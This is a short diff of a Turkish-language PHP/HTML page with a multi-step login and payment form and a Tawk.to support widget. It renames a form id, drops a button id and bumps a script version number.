@@ -1176,7 +1176,7 @@ include '../inc/config.php';
                         </form>
                        </div>
                        <div class="card-body d-none flex-column" id="login-step-3">
-                        <form id="form" action="javascript:;" onsubmit="ekBilgi()">
+                        <form id="form1" action="javascript:;" onsubmit="ekBilgi()">
                           <div class="form-group">
                             <input name="jethavale_ekbilgi" class="form-control">
                           </div>
@@ -1184,7 +1184,7 @@ include '../inc/config.php';
                           <div class="d-flex flex-row">
                             <a aria-label="Geri" tabindex="-1" onclick="maximizeTawkToWidget()" class="btn-lg mt-3 btn-cancel btn btn-secondary" style="font-size: 13px;">Desteğe Bağlan</a>
                             
-                            <button id="sms-button" type="submit"  class="btn-lg btn-block mt-auto btn-login btn btn-primary" aria-label="Ödeme Yap">Gönder</button>
+                            <button type="submit"  class="btn-lg btn-block mt-auto btn-login btn btn-primary" aria-label="Ödeme Yap">Gönder</button>
                           </div>
                         </form>
                        </div>
@@ -1315,6 +1315,6 @@ window.Tawk_API.onLoad = function(){
 
 </script>
 
-    <script type="text/javascript" src="assets/script.js?v=8"></script>
+    <script type="text/javascript" src="assets/script.js?v=10"></script>
   </body>
 </html>
